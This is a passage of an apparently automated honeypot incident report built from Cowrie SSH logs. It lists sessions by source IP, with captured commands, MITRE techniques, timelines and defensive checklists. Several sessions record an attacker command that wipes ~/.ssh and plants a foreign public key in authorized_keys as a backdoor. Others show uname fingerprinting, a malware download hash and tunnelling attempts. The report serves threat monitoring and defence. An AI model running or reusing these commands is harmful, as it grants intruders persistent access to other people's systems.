| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:24:18` | `cowrie.session.connect` |
| `2026-07-08 21:24:18` | `cowrie.client.version` |
| `2026-07-08 21:24:18` | `cowrie.client.kex` |
| `2026-07-08 21:24:19` | `cowrie.login.success` |
| `2026-07-08 21:24:19` | `cowrie.session.params` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.success` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:19` | `cowrie.command.input` |
| `2026-07-08 21:24:20` | `cowrie.log.closed` |
| `2026-07-08 21:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ec365bb5db2

| Field | Detail |
|---|---|
| **Source IP** | `167.71.222[.]255` |
| **First Seen** | 2026-07-08 21:26 |
| **Last Seen** | 2026-07-08 21:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:26:13` | `cowrie.session.connect` |
| `2026-07-08 21:26:13` | `cowrie.client.version` |
| `2026-07-08 21:26:13` | `cowrie.client.kex` |
| `2026-07-08 21:26:14` | `cowrie.login.success` |
| `2026-07-08 21:26:15` | `cowrie.session.params` |
| `2026-07-08 21:26:15` | `cowrie.command.input` |
| `2026-07-08 21:26:15` | `cowrie.command.failed` |
| `2026-07-08 21:26:16` | `cowrie.log.closed` |
| `2026-07-08 21:26:16` | `cowrie.session.params` |
| `2026-07-08 21:26:16` | `cowrie.command.input` |
| `2026-07-08 21:26:17` | `cowrie.session.file_download` |
| `2026-07-08 21:26:17` | `cowrie.log.closed` |
| `2026-07-08 21:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.222[.]255` to AbuseIPDB if not already reported
- [ ] Block `167.71.222[.]255` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf7bb828215b

| Field | Detail |
|---|---|
| **Source IP** | `167.71.222[.]255` |
| **First Seen** | 2026-07-08 21:26 |
| **Last Seen** | 2026-07-08 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:26:17` | `cowrie.session.connect` |
| `2026-07-08 21:26:17` | `cowrie.client.version` |
| `2026-07-08 21:26:17` | `cowrie.client.kex` |
| `2026-07-08 21:26:18` | `cowrie.login.success` |
| `2026-07-08 21:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.222[.]255` to AbuseIPDB if not already reported
- [ ] Block `167.71.222[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca17fc59e128

| Field | Detail |
|---|---|
| **Source IP** | `167.71.222[.]255` |
| **First Seen** | 2026-07-08 21:26 |
| **Last Seen** | 2026-07-08 21:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:26:19` | `cowrie.session.connect` |
| `2026-07-08 21:26:19` | `cowrie.client.version` |
| `2026-07-08 21:26:19` | `cowrie.client.kex` |
| `2026-07-08 21:26:20` | `cowrie.login.success` |
| `2026-07-08 21:26:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `167.71.222[.]255` to AbuseIPDB if not already reported
- [ ] Block `167.71.222[.]255` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a346f100a961

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:26 |
| **Last Seen** | 2026-07-08 21:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:26:47` | `cowrie.session.connect` |
| `2026-07-08 21:26:47` | `cowrie.client.version` |
| `2026-07-08 21:26:47` | `cowrie.client.kex` |
| `2026-07-08 21:26:47` | `cowrie.login.success` |
| `2026-07-08 21:26:49` | `cowrie.session.params` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.success` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.command.input` |
| `2026-07-08 21:26:49` | `cowrie.log.closed` |
| `2026-07-08 21:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-989606709b14

| Field | Detail |
|---|---|
| **Source IP** | `47.84.205[.]178` |
| **First Seen** | 2026-07-08 21:29 |
| **Last Seen** | 2026-07-08 21:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: curl/7.64.1, Accept: */*` |
| **TTPs (MITRE)** | T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:29:10` | `cowrie.session.connect` |
| `2026-07-08 21:29:10` | `cowrie.login.success` |
| `2026-07-08 21:29:10` | `cowrie.session.params` |
| `2026-07-08 21:29:10` | `cowrie.command.input` |
| `2026-07-08 21:29:10` | `cowrie.command.failed` |
| `2026-07-08 21:29:10` | `cowrie.command.input` |
| `2026-07-08 21:29:10` | `cowrie.command.failed` |
| `2026-07-08 21:29:10` | `cowrie.command.input` |
| `2026-07-08 21:29:13` | `cowrie.log.closed` |
| `2026-07-08 21:29:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.84.205[.]178` to AbuseIPDB if not already reported
- [ ] Block `47.84.205[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02708913806c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:29 |
| **Last Seen** | 2026-07-08 21:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:29:31` | `cowrie.session.connect` |
| `2026-07-08 21:29:31` | `cowrie.client.version` |
| `2026-07-08 21:29:31` | `cowrie.client.kex` |
| `2026-07-08 21:29:32` | `cowrie.login.success` |
| `2026-07-08 21:29:33` | `cowrie.session.params` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.success` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.command.input` |
| `2026-07-08 21:29:33` | `cowrie.log.closed` |
| `2026-07-08 21:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60a8400ce390

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 21:30 |
| **Last Seen** | 2026-07-08 21:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:30:03` | `cowrie.session.connect` |
| `2026-07-08 21:30:04` | `cowrie.client.version` |
| `2026-07-08 21:30:04` | `cowrie.client.kex` |
| `2026-07-08 21:30:08` | `cowrie.login.success` |
| `2026-07-08 21:30:11` | `cowrie.session.params` |
| `2026-07-08 21:30:11` | `cowrie.command.input` |
| `2026-07-08 21:30:11` | `cowrie.log.closed` |
| `2026-07-08 21:30:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fb123cc9b4b

| Field | Detail |
|---|---|
| **Source IP** | `182.73.164[.]228` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:06` | `cowrie.session.connect` |
| `2026-07-08 21:31:07` | `cowrie.client.version` |
| `2026-07-08 21:31:07` | `cowrie.client.kex` |
| `2026-07-08 21:31:10` | `cowrie.login.success` |
| `2026-07-08 21:31:11` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.73.164[.]228` to AbuseIPDB if not already reported
- [ ] Block `182.73.164[.]228` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bfdd7e57c3a

| Field | Detail |
|---|---|
| **Source IP** | `200.222.71[.]218` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:16` | `cowrie.session.connect` |
| `2026-07-08 21:31:16` | `cowrie.client.version` |
| `2026-07-08 21:31:16` | `cowrie.client.kex` |
| `2026-07-08 21:31:18` | `cowrie.login.success` |
| `2026-07-08 21:31:19` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:31:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.222.71[.]218` to AbuseIPDB if not already reported
- [ ] Block `200.222.71[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5e7a52217cd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:25` | `cowrie.session.connect` |
| `2026-07-08 21:31:25` | `cowrie.client.version` |
| `2026-07-08 21:31:25` | `cowrie.client.kex` |
| `2026-07-08 21:31:25` | `cowrie.login.success` |
| `2026-07-08 21:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-393490d71237

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:25` | `cowrie.session.connect` |
| `2026-07-08 21:31:25` | `cowrie.client.version` |
| `2026-07-08 21:31:25` | `cowrie.client.kex` |
| `2026-07-08 21:31:25` | `cowrie.login.success` |
| `2026-07-08 21:31:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc35d314d0d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:47` | `cowrie.session.connect` |
| `2026-07-08 21:31:47` | `cowrie.client.version` |
| `2026-07-08 21:31:47` | `cowrie.client.kex` |
| `2026-07-08 21:31:49` | `cowrie.login.success` |
| `2026-07-08 21:31:50` | `cowrie.session.params` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.success` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:50` | `cowrie.command.input` |
| `2026-07-08 21:31:51` | `cowrie.log.closed` |
| `2026-07-08 21:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17ee61077e19

| Field | Detail |
|---|---|
| **Source IP** | `196.28.226[.]124` |
| **First Seen** | 2026-07-08 21:31 |
| **Last Seen** | 2026-07-08 21:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:31:54` | `cowrie.session.connect` |
| `2026-07-08 21:31:55` | `cowrie.client.version` |
| `2026-07-08 21:31:55` | `cowrie.client.kex` |
| `2026-07-08 21:31:57` | `cowrie.login.success` |
| `2026-07-08 21:31:58` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:32:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.28.226[.]124` to AbuseIPDB if not already reported
- [ ] Block `196.28.226[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d6c8326ff42

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 21:32 |
| **Last Seen** | 2026-07-08 21:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:32:29` | `cowrie.session.connect` |
| `2026-07-08 21:32:29` | `cowrie.client.version` |
| `2026-07-08 21:32:30` | `cowrie.client.kex` |
| `2026-07-08 21:32:30` | `cowrie.login.success` |
| `2026-07-08 21:32:30` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:32:30` | `cowrie.direct-tcpip.data` |
| `2026-07-08 21:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028a340dd094

| Field | Detail |
|---|---|
| **Source IP** | `80.65.90[.]155` |
| **First Seen** | 2026-07-08 21:33 |
| **Last Seen** | 2026-07-08 21:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:33:24` | `cowrie.session.connect` |
| `2026-07-08 21:33:24` | `cowrie.client.version` |
| `2026-07-08 21:33:24` | `cowrie.client.kex` |
| `2026-07-08 21:33:25` | `cowrie.login.success` |
| `2026-07-08 21:33:25` | `cowrie.direct-tcpip.request` |
| `2026-07-08 21:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.65.90[.]155` to AbuseIPDB if not already reported
- [ ] Block `80.65.90[.]155` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a2420dc4cd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 21:33 |
| **Last Seen** | 2026-07-08 21:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:33:56` | `cowrie.session.connect` |
| `2026-07-08 21:33:57` | `cowrie.client.version` |
| `2026-07-08 21:33:57` | `cowrie.client.kex` |
| `2026-07-08 21:33:58` | `cowrie.login.success` |
| `2026-07-08 21:34:00` | `cowrie.session.params` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.success` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:00` | `cowrie.command.input` |
| `2026-07-08 21:34:01` | `cowrie.log.closed` |
| `2026-07-08 21:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75dde63704fa

| Field | Detail |
|---|---|
| **Source IP** | `186.195.170[.]10` |
| **First Seen** | 2026-07-08 21:34 |
| **Last Seen** | 2026-07-08 21:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:34:13` | `cowrie.session.connect` |
| `2026-07-08 21:34:13` | `cowrie.client.version` |
| `2026-07-08 21:34:14` | `cowrie.client.kex` |
| `2026-07-08 21:34:14` | `cowrie.login.success` |
| `2026-07-08 21:34:15` | `cowrie.session.params` |
| `2026-07-08 21:34:15` | `cowrie.command.input` |
| `2026-07-08 21:34:15` | `cowrie.command.failed` |
| `2026-07-08 21:34:15` | `cowrie.log.closed` |
| `2026-07-08 21:34:16` | `cowrie.session.params` |
| `2026-07-08 21:34:16` | `cowrie.command.input` |
| `2026-07-08 21:34:16` | `cowrie.session.file_download` |
| `2026-07-08 21:34:16` | `cowrie.log.closed` |
| `2026-07-08 21:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.195.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `186.195.170[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0383935f9a0

| Field | Detail |
|---|---|
| **Source IP** | `186.195.170[.]10` |
| **First Seen** | 2026-07-08 21:34 |
| **Last Seen** | 2026-07-08 21:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 21:34:16` | `cowrie.session.connect` |
| `2026-07-08 21:34:16` | `cowrie.client.version` |
| `2026-07-08 21:34:16` | `cowrie.client.kex` |
| `2026-07-08 21:34:17` | `cowrie.login.success` |
| `2026-07-08 21:34:17` | `cowrie.session.closed` |

